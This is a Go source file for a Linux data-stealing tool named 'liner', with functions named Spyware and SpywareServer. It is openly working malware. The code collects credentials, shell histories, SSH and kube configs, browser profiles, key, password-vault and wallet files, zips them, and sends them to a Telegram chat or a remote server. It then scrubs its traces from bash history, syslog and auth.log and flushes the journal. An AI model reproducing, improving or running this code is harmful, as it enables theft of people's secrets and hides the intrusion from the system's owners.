package core

import (
    "bufio"
    "fmt"
    "io"
    "os"
    "os/exec"
    "path/filepath"
    "strings"
	
    "github.com/Nowafen/liner/payloads"
)

// Spyware handles data extraction and sends to Telegram
func Spyware(dumpType, token, chatID string, silent bool) error {
	// Detect OS
	if !silent {
		fmt.Printf("%s[INFO]%s Detecting OS...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	osInfo, err := payloads.DetectOS()
	if err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to detect OS%s\n", ColorYellow, ColorWhite, ColorReset)
		}
		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to detect OS: %v", err), silent)
		return fmt.Errorf("failed to detect OS: %v", err)
	}
	if !strings.Contains(strings.ToLower(osInfo), "linux") {
		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: This payload only supports Linux systems, detected: %s", osInfo), silent)
		return fmt.Errorf("this payload only supports Linux systems, detected: %s", osInfo)
	}

	// Get current working directory
	cwd, err := os.Getwd()
	if err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to get current working directory%s\n", ColorYellow, ColorWhite, ColorReset)
		}
		sendTelegramMessage(token, chatID, "Error: Failed to get current working directory", silent)
		return fmt.Errorf("failed to get current working directory: %v", err)
	}

	// Create temp directory in current working directory
	tempDir := filepath.Join(cwd, "liner_data")
	if err := os.MkdirAll(tempDir, 0755); err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to create temp directory%s\n", ColorYellow, ColorWhite, ColorReset)
		}
		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to create temp directory: %v", err), silent)
		return fmt.Errorf("failed to create temp directory: %v", err)
	}
	defer func() {
		if err := os.RemoveAll(tempDir); err != nil && !silent {
			fmt.Printf("%s[WARNING]%s Failed to clean up temporary directory%s\n", ColorYellow, ColorWhite, ColorReset)
		}
	}()

	// Collect data based on dump type
	if !silent {
		fmt.Printf("%s[INFO]%s Collecting files...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	var filesToCollect []string
	switch strings.ToLower(dumpType) {
	case "credentials":
		filesToCollect = append(filesToCollect, collectCredentials()...)
	case "password":
		filesToCollect = append(filesToCollect, collectPasswords()...)
	case "session":
		filesToCollect = append(filesToCollect, collectSessions()...)
	case "privatedata":
		filesToCollect = append(filesToCollect, collectPrivateData()...)
	case "all":
		filesToCollect = append(filesToCollect, collectCredentials()...)
		filesToCollect = append(filesToCollect, collectPasswords()...)
		filesToCollect = append(filesToCollect, collectSessions()...)
		filesToCollect = append(filesToCollect, collectPrivateData()...)
	default:
		if !silent {
			fmt.Printf("%s[WARNING]%s Invalid dump type, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
		}
		sendTelegramMessage(token, chatID, "Error: Invalid dump type, stopping", silent)
		return fmt.Errorf("invalid dump type: %s", dumpType)
	}

	// Generate treestructure.txt for system
	treeFile := filepath.Join(cwd, "treestructure.txt")
	if !silent {
		fmt.Printf("%s[INFO]%s Generating tree structures...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	var structureFiles []string
	if err := generateTreeSchema(treeFile); err == nil {
		structureFiles = append(structureFiles, treeFile)
	}

	// Generate user directory structures
	userFiles, err := generateUserStructures(cwd)
	if err == nil {
		structureFiles = append(structureFiles, userFiles...)
	}

	// Check if there are any files to collect
	if len(filesToCollect) == 0 {
		if !silent {
			fmt.Printf("%s[WARNING]%s No files collected, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
		}
		sendTelegramMessage(token, chatID, "Error: No files collected, stopping", silent)
		return fmt.Errorf("no files collected")
	}

	// Copy files to temp directory
	if !silent {
		fmt.Printf("%s[INFO]%s Copying files to temp directory...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	for _, file := range filesToCollect {
		if _, err := os.Stat(file); err != nil {
			continue
		}
		dest := filepath.Join(tempDir, filepath.Base(file))
		if err := copyFile(file, dest); err != nil {
			if !silent {
				fmt.Printf("%s[WARNING]%s Failed to copy file %s: %v%s\n", ColorYellow, ColorWhite, file, err, ColorReset)
			}
			continue
		}
	}

	// Zip files from temp directory
	if !silent {
		fmt.Printf("%s[INFO]%s Zipping files...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	zipFile := filepath.Join(cwd, "liner_data.zip")
	if err := createZipFile(tempDir, zipFile); err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to create zip file, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
		}
		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to create zip file: %v", err), silent)
		return fmt.Errorf("failed to create zip file: %v", err)
	}

	// Send start message
	if !silent {
		fmt.Printf("%s[INFO]%s Sending start message to Telegram...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	if err := sendTelegramMessage(token, chatID, "Hello, starting file transfer...", silent); err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to send start message: %v%s\n", ColorYellow, ColorWhite, err, ColorReset)
		}
	}

	// Send structure files (treestructure.txt and user files)
	for _, file := range structureFiles {
		if _, err := os.Stat(file); err == nil {
			if !silent {
				fmt.Printf("%s[INFO]%s Sending structure file %s to Telegram...%s\n", ColorGreen, ColorWhite, filepath.Base(file), ColorReset)
			}
			if err := SendToTelegram(token, chatID, file, silent); err != nil {
				if !silent {
					fmt.Printf("%s[WARNING]%s Failed to send structure file %s: %v%s\n", ColorYellow, ColorWhite, filepath.Base(file), err, ColorReset)
				}
				sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to send structure file %s: %v", filepath.Base(file), err), silent)
			}
		}
	}

	// Check zip file size (48MB = 48 * 1024 * 1024 bytes)
	const maxZipSize = 48 * 1024 * 1024
	var filesToSend []string
	zipInfo, err := os.Stat(zipFile)
	if err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to get zip file info: %v%s\n", ColorYellow, ColorWhite, err, ColorReset)
		}
		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to get zip file info: %v", err), silent)
		return fmt.Errorf("failed to get zip file info: %v", err)
	}

	if zipInfo.Size() <= maxZipSize {
		// Send zip file directly if size <= 48MB
		if !silent {
			fmt.Printf("%s[INFO]%s Sending zip file %s to Telegram...%s\n", ColorGreen, ColorWhite, filepath.Base(zipFile), ColorReset)
		}
		if err := SendToTelegram(token, chatID, zipFile, silent); err != nil {
			if !silent {
				fmt.Printf("%s[WARNING]%s Failed to send zip file %s: %v%s\n", ColorYellow, ColorWhite, filepath.Base(zipFile), err, ColorReset)
			}
			sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to send zip file %s: %v", filepath.Base(zipFile), err), silent)
		}
		filesToSend = []string{zipFile}
	} else {
		// Split zip file into 25MB parts if size > 48MB
		if !silent {
			fmt.Printf("%s[INFO]%s Splitting zip file...%s\n", ColorGreen, ColorWhite, ColorReset)
		}
		zipParts, err := splitZipFile(zipFile, cwd)
		if err != nil {
			if !silent {
				fmt.Printf("%s[WARNING]%s Failed to split zip file, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
			}
			sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to split zip file: %v", err), silent)
			if err := os.Remove(zipFile); err != nil && !silent {
				fmt.Printf("%s[WARNING]%s Failed to clean up main zip file%s\n", ColorYellow, ColorWhite, ColorReset)
			}
			return fmt.Errorf("failed to split zip file: %v", err)
		}
		// Send zip parts
		for _, part := range zipParts {
			if !silent {
				fmt.Printf("%s[INFO]%s Sending zip part %s to Telegram...%s\n", ColorGreen, ColorWhite, filepath.Base(part), ColorReset)
			}
			if err := SendToTelegram(token, chatID, part, silent); err != nil {
				if !silent {
					fmt.Printf("%s[WARNING]%s Failed to send zip part %s: %v%s\n", ColorYellow, ColorWhite, filepath.Base(part), err, ColorReset)
				}
				sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to send zip part %s: %v", filepath.Base(part), err), silent)
			}
		}
		filesToSend = zipParts
	}

	// Send completion message
	if !silent {
		fmt.Printf("%s[INFO]%s Sending completion message to Telegram...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	if err := sendTelegramMessage(token, chatID, "Goodbye, file transfer completed.", silent); err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to send completion message: %v%s\n", ColorYellow, ColorWhite, err, ColorReset)
		}
	}

	// Clean up zip parts and main zip file
	for _, file := range filesToSend {
		if err := os.Remove(file); err != nil && !silent {
			fmt.Printf("%s[WARNING]%s Failed to clean up file %s%s\n", ColorYellow, ColorWhite, file, ColorReset)
		}
	}

	// Clean up structure files
	for _, file := range structureFiles {
		if _, err := os.Stat(file); err == nil {
			if err := os.Remove(file); err != nil && !silent {
				fmt.Printf("%s[WARNING]%s Failed to clean up structure file %s%s\n", ColorYellow, ColorWhite, file, ColorReset)
			}
		}
	}

	// Clean logs
	if !silent {
		fmt.Printf("%s[INFO]%s Cleaning logs...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	if err := cleanLogs(); err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to clean logs%s\n", ColorYellow, ColorWhite, ColorReset)
		}
		sendTelegramMessage(token, chatID, fmt.Sprintf("Error: Failed to clean logs: %v", err), silent)
	}

	return nil
}

// SpywareServer handles data extraction and sends to server
func SpywareServer(dumpType, server, port, encryption string, silent bool) error {
	// Detect OS
	if !silent {
		fmt.Printf("%s[INFO]%s Detecting OS...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	osInfo, err := payloads.DetectOS()
	if err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to detect OS%s\n", ColorYellow, ColorWhite, ColorReset)
		}
		sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to detect OS: %v", err), silent)
		return fmt.Errorf("failed to detect OS: %v", err)
	}
	if !strings.Contains(strings.ToLower(osInfo), "linux") {
		sendServerMessage(server, port, encryption, fmt.Sprintf("Error: This payload only supports Linux systems, detected: %s", osInfo), silent)
		return fmt.Errorf("this payload only supports Linux systems, detected: %s", osInfo)
	}

	// Get current working directory
	cwd, err := os.Getwd()
	if err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to get current working directory%s\n", ColorYellow, ColorWhite, ColorReset)
		}
		sendServerMessage(server, port, encryption, "Error: Failed to get current working directory", silent)
		return fmt.Errorf("failed to get current working directory: %v", err)
	}

	// Create temp directory in current working directory
	tempDir := filepath.Join(cwd, "liner_data")
	if err := os.MkdirAll(tempDir, 0755); err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to create temp directory%s\n", ColorYellow, ColorWhite, ColorReset)
		}
		sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to create temp directory: %v", err), silent)
		return fmt.Errorf("failed to create temp directory: %v", err)
	}
	defer func() {
		if err := os.RemoveAll(tempDir); err != nil && !silent {
			fmt.Printf("%s[WARNING]%s Failed to clean up temporary directory%s\n", ColorYellow, ColorWhite, ColorReset)
		}
	}()

	// Collect data based on dump type
	if !silent {
		fmt.Printf("%s[INFO]%s Collecting files...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	var filesToCollect []string
	switch strings.ToLower(dumpType) {
	case "credentials":
		filesToCollect = append(filesToCollect, collectCredentials()...)
	case "password":
		filesToCollect = append(filesToCollect, collectPasswords()...)
	case "session":
		filesToCollect = append(filesToCollect, collectSessions()...)
	case "privatedata":
		filesToCollect = append(filesToCollect, collectPrivateData()...)
	case "all":
		filesToCollect = append(filesToCollect, collectCredentials()...)
		filesToCollect = append(filesToCollect, collectPasswords()...)
		filesToCollect = append(filesToCollect, collectSessions()...)
		filesToCollect = append(filesToCollect, collectPrivateData()...)
	default:
		if !silent {
			fmt.Printf("%s[WARNING]%s Invalid dump type, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
		}
		sendServerMessage(server, port, encryption, "Error: Invalid dump type, stopping", silent)
		return fmt.Errorf("invalid dump type: %s", dumpType)
	}

	// Generate treestructure.txt for system
	treeFile := filepath.Join(cwd, "treestructure.txt")
	if !silent {
		fmt.Printf("%s[INFO]%s Generating tree structures...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	var structureFiles []string
	if err := generateTreeSchema(treeFile); err == nil {
		structureFiles = append(structureFiles, treeFile)
	}

	// Generate user directory structures
	userFiles, err := generateUserStructures(cwd)
	if err == nil {
		structureFiles = append(structureFiles, userFiles...)
	}

	// Check if there are any files to collect
	if len(filesToCollect) == 0 {
		if !silent {
			fmt.Printf("%s[WARNING]%s No files collected, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
		}
		sendServerMessage(server, port, encryption, "Error: No files collected, stopping", silent)
		return fmt.Errorf("no files collected")
	}

	// Copy files to temp directory
	if !silent {
		fmt.Printf("%s[INFO]%s Copying files to temp directory...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	for _, file := range filesToCollect {
		if _, err := os.Stat(file); err != nil {
			continue
		}
		dest := filepath.Join(tempDir, filepath.Base(file))
		if err := copyFile(file, dest); err != nil {
			if !silent {
				fmt.Printf("%s[WARNING]%s Failed to copy file %s: %v%s\n", ColorYellow, ColorWhite, file, err, ColorReset)
			}
			continue
		}
	}

	// Zip files from temp directory
	if !silent {
		fmt.Printf("%s[INFO]%s Zipping files...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	zipFile := filepath.Join(cwd, "liner_data.zip")
	if err := createZipFile(tempDir, zipFile); err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to create zip file, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
		}
		sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to create zip file: %v", err), silent)
		return fmt.Errorf("failed to create zip file: %v", err)
	}

	// Send start message
	if !silent {
		fmt.Printf("%s[INFO]%s Sending start message to server...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	if err := sendServerMessage(server, port, encryption, "Hello, starting file transfer...", silent); err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to send start message: %v%s\n", ColorYellow, ColorWhite, err, ColorReset)
		}
	}

	// Send structure files (treestructure.txt and user files)
	for _, file := range structureFiles {
		if _, err := os.Stat(file); err == nil {
			if !silent {
				fmt.Printf("%s[INFO]%s Sending structure file %s to server...%s\n", ColorGreen, ColorWhite, filepath.Base(file), ColorReset)
			}
			if err := SendToServer(server, port, encryption, file, silent); err != nil {
				if !silent {
					fmt.Printf("%s[WARNING]%s Failed to send structure file %s: %v%s\n", ColorYellow, ColorWhite, filepath.Base(file), err, ColorReset)
				}
				sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to send structure file %s: %v", filepath.Base(file), err), silent)
			}
		}
	}

	// Check zip file size (48MB = 48 * 1024 * 1024 bytes)
	const maxZipSize = 48 * 1024 * 1024
	var filesToSend []string
	zipInfo, err := os.Stat(zipFile)
	if err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to get zip file info: %v%s\n", ColorYellow, ColorWhite, err, ColorReset)
		}
		sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to get zip file info: %v", err), silent)
		return fmt.Errorf("failed to get zip file info: %v", err)
	}

	if zipInfo.Size() <= maxZipSize {
		// Send zip file directly if size <= 48MB
		if !silent {
			fmt.Printf("%s[INFO]%s Sending zip file %s to server...%s\n", ColorGreen, ColorWhite, filepath.Base(zipFile), ColorReset)
		}
		if err := SendToServer(server, port, encryption, zipFile, silent); err != nil {
			if !silent {
				fmt.Printf("%s[WARNING]%s Failed to send zip file %s: %v%s\n", ColorYellow, ColorWhite, filepath.Base(zipFile), err, ColorReset)
			}
			sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to send zip file %s: %v", filepath.Base(zipFile), err), silent)
		}
		filesToSend = []string{zipFile}
	} else {
		// Split zip file into 25MB parts if size > 48MB
		if !silent {
			fmt.Printf("%s[INFO]%s Splitting zip file...%s\n", ColorGreen, ColorWhite, ColorReset)
		}
		zipParts, err := splitZipFile(zipFile, cwd)
		if err != nil {
			if !silent {
				fmt.Printf("%s[WARNING]%s Failed to split zip file, stopping%s\n", ColorYellow, ColorWhite, ColorReset)
			}
			sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to split zip file: %v", err), silent)
			if err := os.Remove(zipFile); err != nil && !silent {
				fmt.Printf("%s[WARNING]%s Failed to clean up main zip file%s\n", ColorYellow, ColorWhite, ColorReset)
			}
			return fmt.Errorf("failed to split zip file: %v", err)
		}
		// Send zip parts
		for _, part := range zipParts {
			if !silent {
				fmt.Printf("%s[INFO]%s Sending zip part %s to server...%s\n", ColorGreen, ColorWhite, filepath.Base(part), ColorReset)
			}
			if err := SendToServer(server, port, encryption, part, silent); err != nil {
				if !silent {
					fmt.Printf("%s[WARNING]%s Failed to send zip part %s: %v%s\n", ColorYellow, ColorWhite, filepath.Base(part), err, ColorReset)
				}
				sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to send zip part %s: %v", filepath.Base(part), err), silent)
			}
		}
		filesToSend = zipParts
	}

	// Send completion message
	if !silent {
		fmt.Printf("%s[INFO]%s Sending completion message to server...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	if err := sendServerMessage(server, port, encryption, "Goodbye, file transfer completed.", silent); err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to send completion message: %v%s\n", ColorYellow, ColorWhite, err, ColorReset)
		}
	}

	// Clean up zip parts and main zip file
	for _, file := range filesToSend {
		if err := os.Remove(file); err != nil && !silent {
			fmt.Printf("%s[WARNING]%s Failed to clean up file %s%s\n", ColorYellow, ColorWhite, file, ColorReset)
		}
	}

	// Clean up structure files
	for _, file := range structureFiles {
		if _, err := os.Stat(file); err == nil {
			if err := os.Remove(file); err != nil && !silent {
				fmt.Printf("%s[WARNING]%s Failed to clean up structure file %s%s\n", ColorYellow, ColorWhite, file, ColorReset)
			}
		}
	}

	// Clean logs
	if !silent {
		fmt.Printf("%s[INFO]%s Cleaning logs...%s\n", ColorGreen, ColorWhite, ColorReset)
	}
	if err := cleanLogs(); err != nil {
		if !silent {
			fmt.Printf("%s[WARNING]%s Failed to clean logs%s\n", ColorYellow, ColorWhite, ColorReset)
		}
		sendServerMessage(server, port, encryption, fmt.Sprintf("Error: Failed to clean logs: %v", err), silent)
	}

	return nil
}

// collectCredentials gathers credential-related files
func collectCredentials() []string {
	var files []string
	possibleFiles := []string{
		filepath.Join(os.Getenv("HOME"), ".git-credentials"),
		filepath.Join(os.Getenv("HOME"), ".config/keyring"),
	}
	for _, file := range possibleFiles {
		if info, err := os.Stat(file); err == nil && info.Mode().IsRegular() {
			files = append(files, file)
		}
	}
	return files
}

// collectPasswords gathers password-related files
func collectPasswords() []string {
	var files []string
	possibleFiles := []string{
		filepath.Join(os.Getenv("HOME"), ".bash_history"),
		filepath.Join(os.Getenv("HOME"), ".zsh_history"),
		filepath.Join(os.Getenv("HOME"), ".password-store"),
	}
	for _, file := range possibleFiles {
		if info, err := os.Stat(file); err == nil && info.Mode().IsRegular() {
			files = append(files, file)
		}
	}
	return files
}

// collectSessions gathers session-related files
func collectSessions() []string {
	var files []string
	possibleFiles := []string{
		filepath.Join(os.Getenv("HOME"), ".ssh/authorized_keys"),
		filepath.Join(os.Getenv("HOME"), ".gnupg/pubring.kbx"),
		filepath.Join(os.Getenv("HOME"), ".kube/config"),
		filepath.Join(os.Getenv("HOME"), ".mozilla"),
		filepath.Join(os.Getenv("HOME"), ".config/chromium"),
	}
	for _, file := range possibleFiles {
		if info, err := os.Stat(file); err == nil && info.Mode().IsRegular() {
			files = append(files, file)
		}
	}
	return files
}

// collectPrivateData gathers sensitive private data files
func collectPrivateData() []string {
	var files []string
	patterns := []string{"*.env", "*.p12", "*.pem", "*.kdbx", "*.keepass", "*.sqlite", "*.wallet"}
	for _, pattern := range patterns {
		matches, _ := filepath.Glob(filepath.Join(os.Getenv("HOME"), pattern))
		for _, match := range matches {
			if info, err := os.Stat(match); err == nil && info.Mode().IsRegular() {
				files = append(files, match)
			}
		}
	}

	keywords := []string{"wallet.txt", "trustwallet.txt", "password", "apikey", "important"}
	excludedDirs := []string{"/proc", "/sys", "/dev", "/tmp"}
	filepath.Walk("/", func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		for _, dir := range excludedDirs {
			if strings.HasPrefix(path, dir) {
				return filepath.SkipDir
			}
		}
		if !info.Mode().IsRegular() {
			return nil
		}
		if info.Mode().Perm()&0400 == 0 {
			return nil
		}
		filename := strings.ToLower(filepath.Base(path))
		for _, keyword := range keywords {
			if strings.Contains(filename, keyword) {
				if _, err := os.Stat(path); err == nil {
					files = append(files, path)
				}
			}
		}
		return nil
	})

	return files
}

// copyFile copies a file from src to dst
func copyFile(src, dst string) error {
	input, err := os.Open(src)
	if err != nil {
		return fmt.Errorf("failed to open source file %s: %v", src, err)
	}
	defer input.Close()

	output, err := os.Create(dst)
	if err != nil {
		return fmt.Errorf("failed to create destination file %s: %v", dst, err)
	}
	defer output.Close()

	_, err = io.Copy(output, input)
	if err != nil {
		return fmt.Errorf("failed to copy file %s to %s: %v", src, dst, err)
	}
	return nil
}

// createZipFile zips the files in the temp directory
func createZipFile(tempDir, output string) error {
	// Check if temp directory has files
	entries, err := os.ReadDir(tempDir)
	if err != nil {
		return fmt.Errorf("failed to read temp directory: %v", err)
	}
	if len(entries) == 0 {
		return fmt.Errorf("no files in temp directory to zip")
	}

	// Remove output zip file if it exists
	if _, err := os.Stat(output); err == nil {
		if err := os.Remove(output); err != nil {
			return fmt.Errorf("failed to remove existing zip file: %v", err)
		}
	}

	// Change to temp directory and zip its contents
	if err := os.Chdir(tempDir); err != nil {
		return fmt.Errorf("failed to change to temp directory: %v", err)
	}
	cmd := exec.Command("zip", "-r", output, ".")
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to create zip file: %v, output: %s", err, string(output))
	}
	return nil
}

// splitZipFile splits a zip file into 25MB parts
func splitZipFile(filename, outputDir string) ([]string, error) {
	// Check if zip file exists
	if _, err := os.Stat(filename); os.IsNotExist(err) {
		return nil, fmt.Errorf("zip file %s does not exist", filename)
	}

	// Run split command
	prefix := filepath.Join(outputDir, "part_")
	cmd := exec.Command("split", "-b", "25M", filename, prefix)
	if output, err := cmd.CombinedOutput(); err != nil {
		return nil, fmt.Errorf("failed to split zip file: %v, output: %s", err, string(output))
	}

	// Collect split parts
	var zipParts []string
	entries, err := os.ReadDir(outputDir)
	if err != nil {
		return nil, fmt.Errorf("failed to read split parts: %v", err)
	}
	for _, entry := range entries {
		if strings.HasPrefix(entry.Name(), "part_") && !entry.IsDir() {
			zipParts = append(zipParts, filepath.Join(outputDir, entry.Name()))
		}
	}

	return zipParts, nil
}

// generateTreeSchema generates a system directory tree using the tree command
func generateTreeSchema(output string) error {
	cmd := exec.Command("which", "tree")
	if err := cmd.Run(); err != nil {
		return nil // Skip if tree is not installed
	}

	cmd = exec.Command("sh", "-c", "tree / | tee " + output)
	if output, err := cmd.CombinedOutput(); err != nil {
		return fmt.Errorf("failed to generate tree schema: %v, output: %s", err, string(output))
	}
	return nil
}

// generateUserStructures generates directory structure for each user in /home
func generateUserStructures(cwd string) ([]string, error) {
	var userFiles []string
	homeDir := "/home"
	entries, err := os.ReadDir(homeDir)
	if err != nil {
		return nil, fmt.Errorf("failed to read /home directory: %v", err)
	}

	for _, entry := range entries {
		if entry.IsDir() {
			user := entry.Name()
			userFile := filepath.Join(cwd, fmt.Sprintf("%s.txt", user))
			cmd := exec.Command("sh", "-c", fmt.Sprintf("tree /home/%s | tee %s", user, userFile))
			if output, err := cmd.CombinedOutput(); err == nil {
				userFiles = append(userFiles, userFile)
			} else {
				fmt.Printf("%s[WARNING]%s Failed to generate user structure for %s: %v, output: %s%s\n", ColorYellow, ColorWhite, user, err, string(output), ColorReset)
			}
		}
	}

	return userFiles, nil
}

// cleanLogs removes traces of the tool from system logs
func cleanLogs() error {
	logFiles := []string{
		filepath.Join(os.Getenv("HOME"), ".bash_history"),
		"/var/log/syslog",
		"/var/log/auth.log",
	}
	toolName := "liner"
	for _, log := range logFiles {
		if _, err := os.Stat(log); os.IsNotExist(err) {
			continue
		}
		input, err := os.Open(log)
		if err != nil {
			continue
		}
		defer input.Close()

		tempFile, err := os.CreateTemp("", "liner_log_")
		if err != nil {
			continue
		}
		defer tempFile.Close()

		scanner := bufio.NewScanner(input)
		for scanner.Scan() {
			line := scanner.Text()
			if !strings.Contains(strings.ToLower(line), toolName) {
				fmt.Fprintln(tempFile, line)
			}
		}
		if err := scanner.Err(); err != nil {
			continue
		}

		input.Close()
		tempFile.Close()
		if err := os.Rename(tempFile.Name(), log); err != nil {
			return fmt.Errorf("failed to replace log file %s: %v", log, err)
		}
	}

	if os.Geteuid() == 0 {
		cmd := exec.Command("journalctl", "--flush")
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("failed to flush journalctl logs: %v", err)
		}
	}

	return nil
}
